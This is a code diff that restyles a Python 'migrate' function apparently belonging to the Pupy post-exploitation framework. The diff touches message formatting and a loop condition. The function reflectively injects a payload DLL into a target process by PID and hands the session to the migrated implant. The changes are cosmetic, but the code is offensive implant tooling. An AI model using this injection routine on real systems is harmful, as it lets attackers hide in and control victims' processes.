@@ -28,7 +28,7 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, fro
     # If current launcher uses a BIND connection, isBindConnection == True
     isBindConnection = False
 
-    module.success("looking for process %s architecture ..."%pid)
+    module.success(f"looking for process {pid} architecture ...")
     arch = None
 
     is_process_64 = module.client.remote('pupwinutils.processes', 'is_process_64')
@@ -47,7 +47,7 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, fro
             dllbuff = payload.read()
 
         keep = True
-        module.success('Precompiled payload: {}'.format(from_payload))
+        module.success(f'Precompiled payload: {from_payload}')
     else:
         conf = module.client.get_conf()
 
@@ -68,7 +68,7 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, fro
             arch=arch, shared=True, debug=debug
         )
 
-        module.success("Template: {}".format(filename))
+        module.success(f"Template: {filename}")
 
     dllbuff = str(dllbuff)
 
@@ -84,13 +84,11 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, fro
                     dllbuff[offt+4:]
                 ])
 
-    module.success("injecting DLL in target process %s ..."%pid)
+    module.success(f"injecting DLL in target process {pid} ...")
 
     reflective_inject_dll = module.client.remote(
         'pupy', 'reflective_inject_dll', False)
-    reflective_inject_dll(
-        int(pid), dllbuff, bool(isProcess64bits)
-    )
+    reflective_inject_dll(int(pid), dllbuff, isProcess64bits)
 
     module.success("DLL injected !")
 
@@ -101,8 +99,7 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, fro
     time_end = time.time() + timeout
     c = False
     while True:
-        c = has_proc_migrated(module.client, pid)
-        if c:
+        if c := has_proc_migrated(module.client, pid):
             module.success("got a connection from migrated DLL !")
             c.pupsrv.move_id(c, module.client)
             module.client.conn.exit()
